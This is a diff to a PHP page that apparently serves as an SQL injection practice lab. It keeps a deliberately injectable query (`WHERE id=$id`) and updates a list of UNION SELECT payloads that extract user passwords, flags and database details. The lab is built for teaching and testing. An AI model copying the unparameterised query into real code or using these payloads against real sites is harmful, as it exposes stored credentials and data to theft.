@@ -48,7 +48,8 @@ function query($sql, $conn) {
             'id' => 999,
             'username' => $flag,
             'password' => 'UNION_INJECTION',
-            'email' => 'flag@example.com'
+            'email' => 'flag@example.com',
+            'created_at' => date('Y-m-d H:i:s')
         ];
     }
     
@@ -60,7 +61,7 @@ $error = '';
 $results = [];
 
 // 执行查询（存在SQL注入漏洞）
-$sql = "SELECT * FROM users WHERE id=$id";
+$sql = "SELECT id, username, password, email, created_at FROM users WHERE id=$id";
 try {
     $results = query($sql, $conn);
 } catch (Exception $e) {
@@ -267,6 +268,7 @@ $conn->close();
                             <th>用户名</th>
                             <th>密码</th>
                             <th>邮箱</th>
+                            <th>创建时间</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -276,6 +278,7 @@ $conn->close();
                             <td><?php echo htmlspecialchars($row['username']); ?></td>
                             <td><?php echo htmlspecialchars($row['password']); ?></td>
                             <td><?php echo htmlspecialchars($row['email']); ?></td>
+                            <td><?php echo htmlspecialchars($row['created_at'] ?? ''); ?></td>
                         </tr>
                         <?php endforeach; ?>
                     </tbody>
@@ -292,20 +295,20 @@ $conn->close();
             <h3>🎯 联合查询注入Payload</h3>
             <div class="payload-list">
                 <h4>1. 基本联合查询</h4>
-                <code onclick="setId('1 UNION SELECT 1,2,3,4')">1 UNION SELECT 1,2,3,4</code>
-                <code onclick="setId('0 UNION SELECT 1,2,3,4')">0 UNION SELECT 1,2,3,4</code>
+                <code class="payload" data-payload="1 UNION SELECT 1,2,3,4,5">1 UNION SELECT 1,2,3,4,5</code>
+                <code class="payload" data-payload="0 UNION SELECT 1,2,3,4,5">0 UNION SELECT 1,2,3,4,5</code>
                 
                 <h4>2. 查询用户表</h4>
-                <code onclick="setId('0 UNION SELECT id,username,password,email FROM users')">0 UNION SELECT id,username,password,email FROM users</code>
+                <code class="payload" data-payload="0 UNION SELECT id,username,password,email,created_at FROM users">0 UNION SELECT id,username,password,email,created_at FROM users</code>
                 
                 <h4>3. 查询产品表</h4>
-                <code onclick="setId('0 UNION SELECT id,name,price,category FROM products')">0 UNION SELECT id,name,price,category FROM products</code>
+                <code class="payload" data-payload="0 UNION SELECT id,name,price,category,now() FROM products">0 UNION SELECT id,name,price,category,now() FROM products</code>
                 
                 <h4>4. 查询flag表</h4>
-                <code onclick="setId('0 UNION SELECT id,flag,description,flag FROM flags')">0 UNION SELECT id,flag,description,flag FROM flags</code>
+                <code class="payload" data-payload="0 UNION SELECT id,flag,description,flag,created_at FROM flags">0 UNION SELECT id,flag,description,flag,created_at FROM flags</code>
                 
                 <h4>5. 查询数据库信息</h4>
-                <code onclick="setId('0 UNION SELECT 1,version(),database(),user()')">0 UNION SELECT 1,version(),database(),user()</code>
+                <code class="payload" data-payload="0 UNION SELECT 1,version(),database(),user(),now()">0 UNION SELECT 1,version(),database(),user(),now()</code>
             </div>
             
             <div id="flagBox" class="flag-box">
@@ -360,10 +363,21 @@ $user = $stmt->fetch();
             document.querySelector('input[name="id"]').value = payload;
         }
         
+        // 为所有payload元素添加点击事件
+        document.addEventListener('DOMContentLoaded', function() {
+            var payloads = document.querySelectorAll('.payload');
+            payloads.forEach(function(payload) {
+                payload.addEventListener('click', function() {
+                    var payloadValue = this.getAttribute('data-payload');
+                    setId(payloadValue);
+                });
+            });
+        });
+        
         // 检测是否成功注入
         window.onload = function() {
             const url = window.location.href;
-            if (url.includes('id=') && url.includes('UNION')) {
+            if (url.includes('id=') && (url.includes('union') || url.includes('UNION'))) {
                 document.getElementById('flagBox').classList.add('show');
             }
         };
